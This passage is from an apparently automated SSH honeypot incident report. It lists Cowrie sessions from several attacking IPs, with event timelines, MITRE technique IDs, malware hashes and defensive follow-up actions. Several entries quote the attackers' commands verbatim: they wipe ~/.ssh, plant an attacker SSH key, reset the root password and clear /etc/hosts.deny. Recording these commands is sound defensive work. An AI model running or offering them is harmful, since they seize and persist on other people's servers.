| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:19:01` | `cowrie.session.connect` |
| `2026-05-16 17:19:01` | `cowrie.client.version` |
| `2026-05-16 17:19:02` | `cowrie.client.kex` |
| `2026-05-16 17:19:02` | `cowrie.login.success` |
| `2026-05-16 17:19:02` | `cowrie.session.params` |
| `2026-05-16 17:19:02` | `cowrie.command.input` |
| `2026-05-16 17:19:02` | `cowrie.command.failed` |
| `2026-05-16 17:19:02` | `cowrie.log.closed` |
| `2026-05-16 17:19:03` | `cowrie.session.params` |
| `2026-05-16 17:19:03` | `cowrie.command.input` |
| `2026-05-16 17:19:03` | `cowrie.session.file_download` |
| `2026-05-16 17:19:03` | `cowrie.log.closed` |
| `2026-05-16 17:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eca29742f70

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:19 |
| **Last Seen** | 2026-05-16 17:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:19:05` | `cowrie.session.connect` |
| `2026-05-16 17:19:05` | `cowrie.client.version` |
| `2026-05-16 17:19:05` | `cowrie.client.kex` |
| `2026-05-16 17:19:05` | `cowrie.login.success` |
| `2026-05-16 17:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5507f4bcf1b

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:20 |
| **Last Seen** | 2026-05-16 17:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:20:24` | `cowrie.session.connect` |
| `2026-05-16 17:20:24` | `cowrie.client.version` |
| `2026-05-16 17:20:24` | `cowrie.client.kex` |
| `2026-05-16 17:20:25` | `cowrie.login.success` |
| `2026-05-16 17:20:25` | `cowrie.session.params` |
| `2026-05-16 17:20:25` | `cowrie.command.input` |
| `2026-05-16 17:20:25` | `cowrie.command.failed` |
| `2026-05-16 17:20:25` | `cowrie.log.closed` |
| `2026-05-16 17:20:25` | `cowrie.session.params` |
| `2026-05-16 17:20:25` | `cowrie.command.input` |
| `2026-05-16 17:20:25` | `cowrie.session.file_download` |
| `2026-05-16 17:20:25` | `cowrie.log.closed` |
| `2026-05-16 17:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d98ff3fae467

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:20 |
| **Last Seen** | 2026-05-16 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:20:27` | `cowrie.session.connect` |
| `2026-05-16 17:20:27` | `cowrie.client.version` |
| `2026-05-16 17:20:28` | `cowrie.client.kex` |
| `2026-05-16 17:20:28` | `cowrie.login.success` |
| `2026-05-16 17:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-460f58eaee28

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:23 |
| **Last Seen** | 2026-05-16 17:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:23:05` | `cowrie.session.connect` |
| `2026-05-16 17:23:05` | `cowrie.client.version` |
| `2026-05-16 17:23:05` | `cowrie.client.kex` |
| `2026-05-16 17:23:05` | `cowrie.login.success` |
| `2026-05-16 17:23:06` | `cowrie.session.params` |
| `2026-05-16 17:23:06` | `cowrie.command.input` |
| `2026-05-16 17:23:06` | `cowrie.command.failed` |
| `2026-05-16 17:23:06` | `cowrie.log.closed` |
| `2026-05-16 17:23:06` | `cowrie.session.params` |
| `2026-05-16 17:23:06` | `cowrie.command.input` |
| `2026-05-16 17:23:06` | `cowrie.session.file_download` |
| `2026-05-16 17:23:06` | `cowrie.log.closed` |
| `2026-05-16 17:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa6b93aaad8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:23 |
| **Last Seen** | 2026-05-16 17:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:23:08` | `cowrie.session.connect` |
| `2026-05-16 17:23:08` | `cowrie.client.version` |
| `2026-05-16 17:23:08` | `cowrie.client.kex` |
| `2026-05-16 17:23:09` | `cowrie.login.success` |
| `2026-05-16 17:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb46b88e50ec

| Field | Detail |
|---|---|
| **Source IP** | `120.196.66[.]80` |
| **First Seen** | 2026-05-16 17:37 |
| **Last Seen** | 2026-05-16 17:37 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:LSOyUWSbQM3U"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:37:29` | `cowrie.session.connect` |
| `2026-05-16 17:37:29` | `cowrie.client.version` |
| `2026-05-16 17:37:29` | `cowrie.client.kex` |
| `2026-05-16 17:37:30` | `cowrie.login.success` |
| `2026-05-16 17:37:30` | `cowrie.session.params` |
| `2026-05-16 17:37:30` | `cowrie.command.input` |
| `2026-05-16 17:37:30` | `cowrie.command.failed` |
| `2026-05-16 17:37:30` | `cowrie.log.closed` |
| `2026-05-16 17:37:31` | `cowrie.session.params` |
| `2026-05-16 17:37:31` | `cowrie.command.input` |
| `2026-05-16 17:37:31` | `cowrie.session.file_download` |
| `2026-05-16 17:37:31` | `cowrie.log.closed` |
| `2026-05-16 17:37:47` | `cowrie.session.params` |
| `2026-05-16 17:37:47` | `cowrie.command.input` |
| `2026-05-16 17:37:47` | `cowrie.log.closed` |
| `2026-05-16 17:37:48` | `cowrie.session.params` |
| `2026-05-16 17:37:48` | `cowrie.command.input` |
| `2026-05-16 17:37:48` | `cowrie.log.closed` |
| `2026-05-16 17:37:48` | `cowrie.session.params` |
| `2026-05-16 17:37:48` | `cowrie.command.input` |
| `2026-05-16 17:37:48` | `cowrie.session.file_download` |
| `2026-05-16 17:37:48` | `cowrie.log.closed` |
| `2026-05-16 17:37:49` | `cowrie.session.params` |
| `2026-05-16 17:37:49` | `cowrie.command.input` |
| `2026-05-16 17:37:49` | `cowrie.log.closed` |
| `2026-05-16 17:37:49` | `cowrie.session.params` |
| `2026-05-16 17:37:49` | `cowrie.command.input` |
| `2026-05-16 17:37:49` | `cowrie.log.closed` |
| `2026-05-16 17:37:50` | `cowrie.session.params` |
| `2026-05-16 17:37:50` | `cowrie.command.input` |
| `2026-05-16 17:37:50` | `cowrie.command.input` |
| `2026-05-16 17:37:50` | `cowrie.log.closed` |
| `2026-05-16 17:37:50` | `cowrie.session.params` |
| `2026-05-16 17:37:50` | `cowrie.command.input` |
| `2026-05-16 17:37:51` | `cowrie.log.closed` |
| `2026-05-16 17:37:51` | `cowrie.session.params` |
| `2026-05-16 17:37:51` | `cowrie.command.input` |
| `2026-05-16 17:37:51` | `cowrie.log.closed` |
| `2026-05-16 17:37:51` | `cowrie.session.params` |
| `2026-05-16 17:37:51` | `cowrie.command.input` |
| `2026-05-16 17:37:52` | `cowrie.log.closed` |
| `2026-05-16 17:37:52` | `cowrie.session.params` |
| `2026-05-16 17:37:52` | `cowrie.command.input` |
| `2026-05-16 17:37:52` | `cowrie.log.closed` |
| `2026-05-16 17:37:52` | `cowrie.session.params` |
| `2026-05-16 17:37:52` | `cowrie.command.input` |
| `2026-05-16 17:37:53` | `cowrie.log.closed` |
| `2026-05-16 17:37:53` | `cowrie.session.params` |
| `2026-05-16 17:37:53` | `cowrie.command.input` |
| `2026-05-16 17:37:53` | `cowrie.log.closed` |
| `2026-05-16 17:37:53` | `cowrie.session.params` |
| `2026-05-16 17:37:53` | `cowrie.command.input` |
| `2026-05-16 17:37:54` | `cowrie.log.closed` |
| `2026-05-16 17:37:54` | `cowrie.session.params` |
| `2026-05-16 17:37:54` | `cowrie.command.input` |
| `2026-05-16 17:37:54` | `cowrie.log.closed` |
| `2026-05-16 17:37:54` | `cowrie.session.params` |
| `2026-05-16 17:37:54` | `cowrie.command.input` |
| `2026-05-16 17:37:55` | `cowrie.log.closed` |
| `2026-05-16 17:37:55` | `cowrie.session.params` |
| `2026-05-16 17:37:55` | `cowrie.command.input` |
| `2026-05-16 17:37:55` | `cowrie.log.closed` |
| `2026-05-16 17:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.196.66[.]80` to AbuseIPDB if not already reported
- [ ] Block `120.196.66[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ba3418aea84

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-16 17:38 |
| **Last Seen** | 2026-05-16 17:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:38:08` | `cowrie.session.connect` |
| `2026-05-16 17:38:08` | `cowrie.client.version` |
| `2026-05-16 17:38:08` | `cowrie.client.kex` |
| `2026-05-16 17:38:09` | `cowrie.login.success` |
| `2026-05-16 17:38:09` | `cowrie.session.params` |
| `2026-05-16 17:38:09` | `cowrie.command.input` |
| `2026-05-16 17:38:09` | `cowrie.command.failed` |
| `2026-05-16 17:38:10` | `cowrie.log.closed` |
| `2026-05-16 17:38:10` | `cowrie.session.params` |
| `2026-05-16 17:38:10` | `cowrie.command.input` |
| `2026-05-16 17:38:10` | `cowrie.session.file_download` |
| `2026-05-16 17:38:10` | `cowrie.log.closed` |
| `2026-05-16 17:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e141002aee

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-16 17:38 |
| **Last Seen** | 2026-05-16 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:38:13` | `cowrie.session.connect` |
| `2026-05-16 17:38:13` | `cowrie.client.version` |
| `2026-05-16 17:38:13` | `cowrie.client.kex` |
| `2026-05-16 17:38:14` | `cowrie.login.success` |
| `2026-05-16 17:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5721d0d6190

| Field | Detail |
|---|---|
| **Source IP** | `104.168.169[.]128` |
| **First Seen** | 2026-05-16 17:39 |
| **Last Seen** | 2026-05-16 17:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:39:08` | `cowrie.session.connect` |
| `2026-05-16 17:39:08` | `cowrie.client.version` |
| `2026-05-16 17:39:08` | `cowrie.client.kex` |
| `2026-05-16 17:39:09` | `cowrie.login.success` |
| `2026-05-16 17:39:10` | `cowrie.session.params` |
| `2026-05-16 17:39:10` | `cowrie.command.input` |
| `2026-05-16 17:39:10` | `cowrie.command.failed` |
| `2026-05-16 17:39:10` | `cowrie.log.closed` |
| `2026-05-16 17:39:11` | `cowrie.session.params` |
| `2026-05-16 17:39:11` | `cowrie.command.input` |
| `2026-05-16 17:39:11` | `cowrie.session.file_download` |
| `2026-05-16 17:39:11` | `cowrie.log.closed` |
| `2026-05-16 17:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.169[.]128` to AbuseIPDB if not already reported
- [ ] Block `104.168.169[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1d58e8b4d2

| Field | Detail |
|---|---|
| **Source IP** | `104.168.169[.]128` |
| **First Seen** | 2026-05-16 17:39 |
| **Last Seen** | 2026-05-16 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:39:14` | `cowrie.session.connect` |
| `2026-05-16 17:39:14` | `cowrie.client.version` |
| `2026-05-16 17:39:14` | `cowrie.client.kex` |
| `2026-05-16 17:39:15` | `cowrie.login.success` |
| `2026-05-16 17:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.169[.]128` to AbuseIPDB if not already reported
- [ ] Block `104.168.169[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff52024275f2

| Field | Detail |
|---|---|
| **Source IP** | `101.96.197[.]182` |
| **First Seen** | 2026-05-16 17:41 |
| **Last Seen** | 2026-05-16 17:42 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2qKHh3oRk1b9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:41:49` | `cowrie.session.connect` |
| `2026-05-16 17:41:49` | `cowrie.client.version` |
| `2026-05-16 17:41:49` | `cowrie.client.kex` |
| `2026-05-16 17:41:50` | `cowrie.login.success` |
| `2026-05-16 17:41:50` | `cowrie.session.params` |
| `2026-05-16 17:41:50` | `cowrie.command.input` |
| `2026-05-16 17:41:50` | `cowrie.command.failed` |
| `2026-05-16 17:41:50` | `cowrie.log.closed` |
| `2026-05-16 17:41:50` | `cowrie.session.params` |
| `2026-05-16 17:41:50` | `cowrie.command.input` |
| `2026-05-16 17:41:51` | `cowrie.session.file_download` |
| `2026-05-16 17:41:51` | `cowrie.log.closed` |
| `2026-05-16 17:42:20` | `cowrie.session.params` |
| `2026-05-16 17:42:20` | `cowrie.command.input` |
| `2026-05-16 17:42:20` | `cowrie.log.closed` |
| `2026-05-16 17:42:20` | `cowrie.session.params` |
| `2026-05-16 17:42:20` | `cowrie.command.input` |
| `2026-05-16 17:42:21` | `cowrie.log.closed` |
| `2026-05-16 17:42:21` | `cowrie.session.params` |
| `2026-05-16 17:42:21` | `cowrie.command.input` |
| `2026-05-16 17:42:21` | `cowrie.session.file_download` |
| `2026-05-16 17:42:21` | `cowrie.log.closed` |
| `2026-05-16 17:42:21` | `cowrie.session.params` |
| `2026-05-16 17:42:21` | `cowrie.command.input` |
| `2026-05-16 17:42:21` | `cowrie.log.closed` |
| `2026-05-16 17:42:22` | `cowrie.session.params` |
| `2026-05-16 17:42:22` | `cowrie.command.input` |
| `2026-05-16 17:42:22` | `cowrie.log.closed` |
| `2026-05-16 17:42:22` | `cowrie.session.params` |
| `2026-05-16 17:42:22` | `cowrie.command.input` |
| `2026-05-16 17:42:22` | `cowrie.command.input` |
| `2026-05-16 17:42:22` | `cowrie.log.closed` |
| `2026-05-16 17:42:23` | `cowrie.session.params` |
| `2026-05-16 17:42:23` | `cowrie.command.input` |
| `2026-05-16 17:42:23` | `cowrie.log.closed` |
| `2026-05-16 17:42:23` | `cowrie.session.params` |
| `2026-05-16 17:42:23` | `cowrie.command.input` |
| `2026-05-16 17:42:23` | `cowrie.log.closed` |
| `2026-05-16 17:42:24` | `cowrie.session.params` |
| `2026-05-16 17:42:24` | `cowrie.command.input` |
| `2026-05-16 17:42:24` | `cowrie.log.closed` |
| `2026-05-16 17:42:24` | `cowrie.session.params` |
| `2026-05-16 17:42:24` | `cowrie.command.input` |
| `2026-05-16 17:42:24` | `cowrie.log.closed` |
| `2026-05-16 17:42:24` | `cowrie.session.params` |
| `2026-05-16 17:42:24` | `cowrie.command.input` |
| `2026-05-16 17:42:25` | `cowrie.log.closed` |
| `2026-05-16 17:42:25` | `cowrie.session.params` |
| `2026-05-16 17:42:25` | `cowrie.command.input` |
| `2026-05-16 17:42:25` | `cowrie.log.closed` |
| `2026-05-16 17:42:25` | `cowrie.session.params` |
| `2026-05-16 17:42:25` | `cowrie.command.input` |
| `2026-05-16 17:42:26` | `cowrie.log.closed` |
| `2026-05-16 17:42:26` | `cowrie.session.params` |
| `2026-05-16 17:42:26` | `cowrie.command.input` |
| `2026-05-16 17:42:26` | `cowrie.log.closed` |
| `2026-05-16 17:42:26` | `cowrie.session.params` |
| `2026-05-16 17:42:26` | `cowrie.command.input` |
| `2026-05-16 17:42:27` | `cowrie.log.closed` |
| `2026-05-16 17:42:27` | `cowrie.session.params` |
| `2026-05-16 17:42:27` | `cowrie.command.input` |
| `2026-05-16 17:42:27` | `cowrie.log.closed` |
| `2026-05-16 17:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.197[.]182` to AbuseIPDB if not already reported
- [ ] Block `101.96.197[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d219933317

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-05-16 17:41 |
| **Last Seen** | 2026-05-16 17:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:41:49` | `cowrie.session.connect` |
| `2026-05-16 17:41:49` | `cowrie.client.version` |
